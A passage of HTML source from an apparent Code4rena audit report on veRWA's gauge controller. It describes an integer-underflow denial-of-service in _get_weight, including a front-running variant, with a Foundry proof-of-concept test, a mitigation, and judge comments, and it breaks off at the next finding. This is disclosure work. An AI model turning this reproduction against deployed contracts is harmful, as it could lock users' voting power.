<code>&#x3C;SLOPE> * &#x3C;TIME_TO_END_OF_STAKING_PERIOD> = &#x3C;INITIAL_BIAS></code>.</p>\n<p>However, it is possible to artificially change <code>points_weight[_gauge_addr][t].bias</code> by calling <code>change_gauge_weight</code> (which can be only called by the governance). It important to notice here, that <code>change_gauge_weight</code> <strong>doesn’t modify</strong> <code>points_weight[_gauge_addr][t].slope</code></p>\n<p><code>change_gauge_weight</code> does permit to change the weight to a smaller number than its current value, so it’s both perfectly legal and possible that governance does this at some point (it could be changing the weight to <code>0</code> or any other value smaller than the current one).</p>\n<p>Then, at some point when <code>_get_weight</code> is called, we will enter the <code>else</code> block because <code>pt.bias</code> will be less than the sum of all user’s biases (since originally these values were equal, but <code>pt.bias</code> was lowered by the governance). It will set <code>pt.bias</code> and <code>pt.slope</code> to <code>0</code>.</p>\n<p>After some time, the governance may realise that the gauge’s weight is <code>0</code>, but should be bigger and may change it to some bigger value.</p>\n<p>We will have the situation where <code>points_weight[_gauge_addr][t].slope = 0</code> and <code>points_weight[_gauge_addr][t].bias > 0</code>.</p>\n<p>If this happens and there is any nonzero <code>changes_weight[_gauge_addr]</code> not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at <code>_gauge_addr</code> will not work.</p>\n<p>It’s because, the following functions:</p>\n<ul>\n<li><code>checkpoint_gauge</code></li>\n<li><code>gauge_relative_weight_write</code></li>\n<li><code>gauge_relative_weight</code></li>\n<li><code>_change_gauge_weight</code></li>\n<li><code>change_gauge_weight</code></li>\n<li><code>vote_for_gauge_weights</code></li>\n<li><code>remove_gauge</code></li>\n</ul>\n<p>call <code>_get_weight</code> at some point.</p>\n<p>Let’s see what will happen in <code>_get_weight</code> when it’s called:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">d_bias</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">pt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">pt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bias</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">d_bias</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">pt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bias</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">d_bias</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">d_slope</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">changes_weight</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_gauge_addr</span><span class=\"mtk1\">][</span><span class=\"mtk12\">t</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">pt</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">d_slope</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>We will enter the <code>if</code> statement, because <code>pt.bias</code> will be <code>> 0</code> and <code>pt.slope</code> will be <code>0</code> (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to <code>0</code> in the <code>else</code> statement and wasn’t touched when gauge’s weight was changed by the governance. We will:</p>\n<ul>\n<li>Subtract <code>d_bias</code> from <code>pt.bias</code> which will succeed</li>\n<li>Attempt to subtract <code>changes_weight[_gauge_addr][t]</code> from <code>d_slope</code></li>\n</ul>\n<p>However, there could be a user (or users) whose voting power allocation finishes at <code>t</code> for some <code>t</code> not yet handled. It means that <code>changes_weight[_gauge_addr][t] > 0</code> (and if <code>pt.slope</code> is not <code>0</code>, then <code>changes_weight[_gauge_addr][t]</code> still may be greater than it).</p>\n<p>If this happens, then the integer underflow will happen in <code>pt.slope -= d_slope;</code>. It will now happen in <strong>every</strong> call to <code>_get_weight</code> and it won’t be possible to recover, because:</p>\n<ul>\n<li><code>vote_for_gauge_weights</code> will revert</li>\n<li><code>change_gauge_weight</code> will revert</li>\n</ul>\n<p>as they call <code>_get_weight</code> internally. So, it won’t be possible to modify <code>pt.slope</code> and <code>pt.bias</code> for any point in time, so the <code>revert</code> will always happen for that gauge. It won’t even be possible to remove that gauge.</p>\n<p>So, in short, the scenario is as follows:</p>\n<ol>\n<li>Users allocate their voting power to a gauge <code>X</code>.</li>\n<li>Governance at some point decreases the weight of <code>X</code>.</li>\n<li>Users withdraw their voting power as the time passes, and finally the weight of <code>X</code> drops to <code>0</code>.</li>\n<li>Governance realises this and increases weight of <code>X</code> since it wants to incentivise users to provide liquidity in <code>X</code>.</li>\n<li>Voting power delegation of some user(s) ends some time after that and <code>_get_weight</code> attempts to subtract <code>changes_weight[_gauge_addr][t]</code> from the current slope (which is either <code>0</code> or some small value) and it results in integer underflow.</li>\n<li><code>X</code> is unusable and it’s impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of <code>X</code> cannot be changed anymore and <code>X</code> cannot be even removed.</li>\n</ol>\n<p><strong>Note that it is also possible to frontrun the call to <code>change_gauge_weight</code> when the weight is set to a lower value</strong> - user with a lot of capital can watch the mempool and if weight is lowered to some value <code>x</code>, he can give a voting power of <code>x</code> to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = <code>0</code>. Then, governance will manually increase the weight to recover and DoS will happen as described. <strong>So it is only needed that governance decreases gauge’s weight at some point</strong>.</p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>As stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.</p>\n<p>In order for this situation to succeed, governance has to decrease weight of some gauge, but I think it’s very likely, because:</p>\n<ol>\n<li><code>_get_weight</code> checks that <code>if (pt.bias > d_bias)</code> and it handles the opposite situation, so it is anticipated that it may genuinely happen.</li>\n<li>It is definitely possible to decrease gauge’s weight and it’s even possible to zero it out (as in the <code>remove_gauge</code>).</li>\n<li>The situation where <code>old_bias</code> is greater than <code>old_sum_bias + new_bias</code> is handled in <code>vote_for_gauge_weights</code>, but it may only happen when gauge’s weight was decreased by the governance.</li>\n<li>The situation where <code>old_slope.slope</code> is greater than <code>old_sum_slope + new_slope.slope</code> is also handled there, but it may only happen if we enter the <code>else</code> statement in <code>_get_weight</code>.</li>\n</ol>\n<p>So, it is predicted that gauge’s weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it’s likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn’t be if we assumed that governance would never allowed them to happen).</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Please run the test below. The test shows slightly simplified situation where governance just sets weight to <code>0</code> for <code>gauge1</code>, but as I’ve described above, it suffices that it’s just changed to a smaller value and it may drop to <code>0</code> naturally as users withdraw their voting power. The following import will also have to be added: <code>import {Test, stdError} from \"forge-std/Test.sol\";</code>.</p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testPoC1</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// gauge is being set up</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add_gauge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">change_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// `user1` pays some money and adds his power to `gauge1`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk12\">createLock</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">checkpoint_gauge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// `user2` does the same</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ve</span><span class=\"mtk1\">.</span><span class=\"mtk12\">createLock</span><span class=\"mtk1\">{value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">checkpoint_gauge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1825</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">14</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// weight is changed to `0`, just to simplify</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// normally, weight would just be decreased here and then subsequently decreased by users when their</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// locking period is over until it finally drops to `0`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// alternatively, some whale can frontrun a call to `change_gauge_weight` as described and then</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// withdraw his voting power leaving the gauge with `0` slope and `0` bias</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">change_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// now, weight is changed to some bigger value</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">change_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// some time passes so that user1&#39;s locking period ends</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// `user2` cannot change his weight although his `locked.end` is big enough</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stdError</span><span class=\"mtk1\">.</span><span class=\"mtk12\">arithmeticError</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vote_for_gauge_weights</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// governance cannot change weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stdError</span><span class=\"mtk1\">.</span><span class=\"mtk12\">arithmeticError</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">change_gauge_weight</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// governance cannot even remove the gauge</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// it&#39;s now impossible to do anything on gauge1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stdError</span><span class=\"mtk1\">.</span><span class=\"mtk12\">arithmeticError</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">remove_gauge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gauge1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n</details>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Perform <code>pt.slope -= d_slope</code> in <code>_get_weight</code> only when <code>pt.slope >= d.slope</code> and otherwise zero it out.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/206#issuecomment-1678343307\">__141345__ (Lookout) commented</a>:</strong></p>\n<blockquote>\n<p><code>pt.slope -= d_slope</code> underflow, DoS gauge operation.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/206#issuecomment-1681957273\">OpenCoreCH (veRWA) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/206#issuecomment-1693869666\">alcueca (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>This finding does a great job at describing the vulnerability and its impact from a computational point of view, including an executable PoC. Its duplicate <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/386\">#386</a> is also worthy of note since it explains the root cause from a mathematical point of view. Although this finding was selected as best, both findings should be read for their complementary points of view.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-06-users-may-be-forced-into-long-lock-times-to-be-able-to-undelegate-back-to-themselves\" style=\"position:relative;\"><a href=\"#h-06-users-may-be-forced-into-long-lock-times-to-be-able-to-undelegate-back-to-themselves\" aria-label=\"h 06 users may be forced into long lock times to be able to undelegate back to themselves permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/182\">[H-06] Users may be forced into long lock times to be able to undelegate back to themselves</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/182\">ADM</a>, also found by lsaudit (<a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/411\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/135\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/355\">QiuhaoLi</a>, Jorgect (<a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/264\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/255\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/245\">SpicyMeatball</a>, bart1e (<a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/235\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/218\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/223\">Yanchuan</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/116\">3docSec</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/58\">MrPotatoMagic</a>, nemveer (<a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/458\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/389\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/407\">Yuki</a>, <a 